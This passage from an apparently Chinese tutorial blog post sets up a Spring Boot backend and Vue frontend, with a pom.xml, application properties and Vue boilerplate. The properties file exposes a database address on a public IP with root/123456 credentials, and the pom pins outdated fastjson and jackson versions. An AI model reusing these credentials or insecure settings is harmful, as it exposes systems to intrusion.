class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--maven版本和头文件--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0</span></span><br><span class="hljs-string"><span class="hljs-tag">http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--    自己配置的GVA--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.ccnu.springboot.demo4<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springbootdemo5<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--    项目的打包方式--&gt;</span><br><span class="hljs-comment">&lt;!--    jar:java应用--&gt;</span><br><span class="hljs-comment">&lt;!--    war:javaweb应用--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--    父工程坐标--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--    配置--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.reporting.outputEncoding</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">fastjson.version</span>&gt;</span>1.2.25<span class="hljs-tag">&lt;/<span class="hljs-name">fastjson.version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">mybatis.version</span>&gt;</span>1.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">mybatis.version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">druid.version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">druid.version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven-jar-plugin.version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">maven-jar-plugin.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--    项目依赖--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 分页功能 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.pagehelper<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pagehelper-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- Spring Boot的web启动器 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- Thymeleaf --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- MyBatis --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;mybatis.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- 连接池 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;druid.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- lombok --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 工具包 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-lang3<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;fastjson.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-databind<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jackson-annotations<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-comment">&lt;!-- 打jar包时如果不配置该插件，打出来的jar包没有清单文件 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>3、新建配置文件</strong></p><p>在&#x2F;backend&#x2F;src&#x2F;main&#x2F;resources下新建application.properties或application.yml（二者都是配置文件，写法不同）</p><p>application.properties中为：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">project.name</span>=<span class="hljs-string">kanbingbing</span><br><span class="hljs-attr">project.version</span>=<span class="hljs-string">1.0.0</span><br><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8081</span><br><br><span class="hljs-attr">spring.datasource.url</span>=<span class="hljs-string">jdbc:mysql://114.115.218.247:3307/xbb_db?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai</span><br><span class="hljs-comment">#spring.datasource.url=jdbc:mysql://localhost:3306/xbb_db?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai</span><br><span class="hljs-attr">spring.datasource.username</span>=<span class="hljs-string">root</span><br><span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-string">123456</span><br><span class="hljs-attr">spring.datasource.driver-class-name</span>=<span class="hljs-string">com.mysql.cj.jdbc.Driver</span><br><span class="hljs-attr">spring.datasource.type</span>=<span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br><br><span class="hljs-attr">spring.jackson.time-zone</span>=<span class="hljs-string">GMT+8</span><br><br><span class="hljs-attr">spring.jackson.date-format</span>=<span class="hljs-string">yyyy-MM-dd HH:mm:ss</span><br><br><span class="hljs-attr">spring.thymeleaf.cache</span>=<span class="hljs-string">false</span><br><span class="hljs-attr">spring.resources.static-locations</span>=<span class="hljs-string">classpath:/static/</span><br><br><span class="hljs-attr">mybatis.type-aliases-package</span>=<span class="hljs-string">com.xbb.entity</span><br><span class="hljs-attr">mybatis.mapper-locations</span>=<span class="hljs-string">classpath:mybatis/mappers/*.xml</span><br><br><span class="hljs-attr">logback.level</span>=<span class="hljs-string">INFO</span><br><span class="hljs-attr">logging.level.com.ccnu</span>=<span class="hljs-string">debug</span><br><br><span class="hljs-attr">file.upload.path</span>=<span class="hljs-string">C:\\Shirley-learning\\apache-tomcat-9.0.24-windows-x64\\apache-tomcat-9.0.24\\webapps\\tanghulu</span><br><br><span class="hljs-attr">spring.servlet.multipart.max-file-size</span>=<span class="hljs-string">2MB</span><br><span class="hljs-attr">spring.servlet.multipart.max-request-size</span>=<span class="hljs-string">2MB</span><br></code></pre></td></tr></table></figure><p>application.yml中为：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">pagehelper:</span><br>  <span class="hljs-attr">helperDialect:</span> <span class="hljs-string">mysql</span><br>  <span class="hljs-attr">reasonable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">supportMethodsArguments:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">params:</span> <span class="hljs-string">count=countSql</span><br><br></code></pre></td></tr></table></figure><h3 id="用mybatis管理数据库"><a href="#用mybatis管理数据库" class="headerlink" title="用mybatis管理数据库"></a>用mybatis管理数据库</h3><p>在&#x2F;backend&#x2F;src&#x2F;main&#x2F;resources下新建mybatis.mappers文件夹，存放xml文件，目录如图所示：</p><p><img src="/blog/2022/09/01/%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93/2022-04-04_153709.png" alt="2022-04-04_153709"></p><h3 id="以Spring-MVC架构编写程序"><a href="#以Spring-MVC架构编写程序" class="headerlink" title="以Spring MVC架构编写程序"></a>以Spring MVC架构编写程序</h3><p>在&#x2F;backend&#x2F;src&#x2F;main&#x2F;java&#x2F;azure下</p><p>新建entity文件夹存放实体类，实体类类名及属性最好与数据库的表名和字段对应；</p><p>新建dao文件夹作为数据访问层，与编写sql语言直接操作数据库的xml文件相对应，命名如：ArticleMapper接口类；</p><p>新建service文件夹作为业务层，再在service文件夹下新建impl文件夹，二者分别存放service接口类和serviceImpl接口实现类，命名如：ArticleService接口类和ArticleServiceImpl接口实现类；</p><p>新建controller文件夹作为控制层，调用service层的方法以及向前端提供接口，命名如ArticleController类；</p><p>新建utils文件夹存放工具类，如CodeGenerator类、Result类。</p><p>![未命名文件 (1)](.&#x2F;未命名文件 (1).png)</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此，一个项目的后端框架已经搭建完毕，之后的开发按照上述规则进行。</p><h2 id="搭建前端"><a href="#搭建前端" class="headerlink" title="搭建前端"></a>搭建前端</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>需要的环境</p><p>Node.js : <a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p><p>安装就无脑下一步就好,安装在自己的环境目录下</p><p>Git : <a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p><p>镜像:<a href="https://npm.taobao.org/mirrors/git-for-windows/">https://npm.taobao.org/mirrors/git-for-windows/</a></p><p>确认nodejs安装成功:</p><p>cmd 下输入 node -v,查看是否能够正确打印出版本号即可!</p><p>cmd 下输入 npm-v,查看是否能够正确打印出版本号即可!</p><p>这个npm,就是一个软件包管理工具,就和linux下的apt软件安装差不多!</p><p>安装 Node.js 淘宝镜像加速器（cnpm）</p><p>这样子的话,下载会快很多~</p><p>在命令台输入-g 就是全局安装</p><p>npm install cnpm -g</p><p>或使用如下语句解决 npm 速度慢的问题</p><p>npm install –registry&#x3D;<a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a></p><p>在命令台输入</p><p>cnpm install vue-cli -g</p><p>查看是否安装成功</p><p>vue list</p><h3 id="新建vue脚手架"><a href="#新建vue脚手架" class="headerlink" title="新建vue脚手架"></a>新建vue脚手架</h3><p>进入想新建项目的文件夹，打开控制台</p><p>创建脚手架：vue init webpack frontend</p><blockquote><p>克隆项目：git clone (地址)</p></blockquote><p>然后有一系列选项需要自定义，一般来说可以一路default，选择结束后会显示在安装中</p><p>运行vue：</p><p>cd frontend</p><p>npm install</p><p>npm run dev</p><p>打开<a href="http://localhost:8080/#/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0vue%E8%84%9A%E6%89%8B%E6%9E%B6%E7%9A%84%E4%B8%80%E4%B8%AA%E9%BB%98%E8%AE%A4%E9%A1%B5%E9%9D%A2%EF%BC%8C%E8%87%AA%E5%B7%B1%E5%9C%A8%E5%86%99%E9%A1%B9%E7%9B%AE%E4%B9%8B%E5%89%8D%E9%9C%80%E8%A6%81%E5%B0%86%E5%BE%88%E5%A4%9A%E4%B8%9C%E8%A5%BF%E5%88%A0%E9%99%A4%EF%BC%8C%E8%BF%99%E4%BA%9B%E5%88%9D%E5%A7%8B%E5%8C%96%E6%93%8D%E4%BD%9C%E5%A6%82%E4%B8%8B%EF%BC%9A">http://localhost:8080/#/，可以看到vue脚手架的一个默认页面，自己在写项目之前需要将很多东西删除，这些初始化操作如下：</a></p><ul><li><p>将src&#x2F;assets中的logo.png替换成自己的logo.png</p></li><li><p>将components中的HelloWorld.vue删除</p></li><li><p>将router&#x2F;index.js中的内容替换如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Router</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Router</span>)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>(&#123;<br>  <span class="hljs-attr">routes</span>: [<br>      <span class="hljs-comment">//此处开始写自己的路由</span><br>  ]<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>将App.vue中的内容替换如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;template&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span>/&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>&lt;/template&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span></span><br><span class="language-javascript"><span class="language-xml">  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span></span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure></li><li><p>将main.js中的内容替换如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// The Vue build version to load with the `import` command</span><br><span class="hljs-comment">// (runtime-only or standalone) has been set in webpack.base.conf with an alias.</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App&#x27;</span><br><span class="hljs-comment">// 扫描路由配置</span><br><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./router&#x27;</span><br><span class="hljs-comment">// 导入Axios</span><br><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Axios</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-axios&#x27;</span><br><span class="hljs-comment">// 导入vuex</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./store&#x27;</span><br><span class="hljs-comment">// 导入element-ui</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ElementUI</span> <span 